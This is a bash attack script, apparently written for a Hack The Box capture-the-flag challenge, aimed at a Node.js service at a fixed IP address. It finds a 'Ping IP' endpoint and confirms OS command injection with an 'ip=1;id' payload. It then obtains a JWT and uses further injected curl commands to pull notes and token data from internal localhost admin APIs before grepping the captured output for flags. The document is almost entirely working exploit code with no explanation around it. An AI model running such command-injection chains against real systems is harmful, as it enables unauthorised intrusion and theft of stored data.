#!/usr/bin/env bash
set -euo pipefail
TO=8
IP=94.237.49.23
API_PORT=41412
API_BASE="http://$IP:$API_PORT"
NMAP_FILE="/workspace/recon/nmap/tcp_full.nmap"
OUT_DIR="/workspace/recon/httpx"
TMP_DIR="/workspace/recon/tmp"
RCE_PORT=""
mkdir -p "$OUT_DIR" "$TMP_DIR"
# 1) Collect candidate Node/Express ports from nmap snapshot
CANDIDATE_PORTS=$(rg -n "Node\\.js" -S "$NMAP_FILE" | awk '{print $1}' | cut -d/ -f1 | sort -n | uniq)
# Ensure 52548 is included (known from earlier)
CANDIDATE_PORTS="$CANDIDATE_PORTS 52548"
echo "Candidates: $CANDIDATE_PORTS" | tee "$OUT_DIR/candidate_ports.txt"
# 2) Find the Ping IP endpoint among candidates
for p in $CANDIDATE_PORTS; do
  echo "== Probe :$p ==" | tee -a "$OUT_DIR/ports_probe.log"
  /workspace/recon/scripts/with_timeout.sh "$TO" -- bash -lc "curl -fsS -m $TO --connect-timeout $TO -s http://$IP:$p/ | head -n 30" > "$OUT_DIR/port_${p}_index.html" || true
  if rg -qi "Ping IP|Ping Your IP|name='ping'|action='/ping'" "$OUT_DIR/port_${p}_index.html"; then
    RCE_PORT="$p"
    break
  fi
done
if [[ -z "${RCE_PORT:-}" ]]; then RCE_PORT=52548; fi
echo "RCE_PORT=$RCE_PORT" | tee "$OUT_DIR/rce_port.txt"
RCE_BASE="http://$IP:$RCE_PORT/ping"
# 3) Sanity-check RCE with id
/workspace/recon/scripts/with_timeout.sh "$TO" -- bash -lc "curl -fsS -m $TO --connect-timeout $TO -s -X POST --data-urlencode 'ip=1;id' $RCE_BASE" | tee "$OUT_DIR/rce_id.txt" >/dev/null || true
# 4) Fresh JWT token
curl -fsS -m 8 --connect-timeout 8 -H 'Content-Type: application/json' -d '{"email":"a@a.com","password":"a"}' "$API_BASE/api/auth/login" > "$OUT_DIR/login_resp.json"
jq -r .token "$OUT_DIR/login_resp.json" > "$TMP_DIR/token.txt"
TOKEN=$(cat "$TMP_DIR/token.txt")
# 5) Inject: curl localhost admin endpoints
printf "ip=1;curl -s -H 'Authorization: Bearer %s' http://127.0.0.1:41412/api/notes/all" "$TOKEN" > "$TMP_DIR/inj_all.txt"
/workspace/recon/scripts/with_timeout.sh "$TO" -- bash -lc "curl -fsS -m $TO --connect-timeout $TO -s -X POST --data-urlencode ip@'$TMP_DIR/inj_all.txt' $RCE_BASE" | tee "$OUT_DIR/localhost_notes_all.json" >/dev/null || true
# 6) Inject: list many notes
printf "ip=1;curl -s -H 'Authorization: Bearer %s' 'http://127.0.0.1:41412/api/notes?limit=1000'" "$TOKEN" > "$TMP_DIR/inj_list.txt"
/workspace/recon/scripts/with_timeout.sh "$TO" -- bash -lc "curl -fsS -m $TO --connect-timeout $TO -s -X POST --data-urlencode ip@'$TMP_DIR/inj_list.txt' $RCE_BASE" | tee "$OUT_DIR/localhost_notes_list.json" >/dev/null || true
# 7) Verify token via localhost
printf "ip=1;curl -s -H 'Authorization: Bearer %s' http://127.0.0.1:41412/api/auth/verify" "$TOKEN" > "$TMP_DIR/inj_verify.txt"
/workspace/recon/scripts/with_timeout.sh "$TO" -- bash -lc "curl -fsS -m $TO --connect-timeout $TO -s -X POST --data-urlencode ip@'$TMP_DIR/inj_verify.txt' $RCE_BASE" | tee "$OUT_DIR/localhost_verify.json" >/dev/null || true
# 8) Grep for HTB flags in all captured outputs
rg -n "HTB\{[^}]+\}" -S "$OUT_DIR" | tee "$OUT_DIR/htb_hits.txt" || true
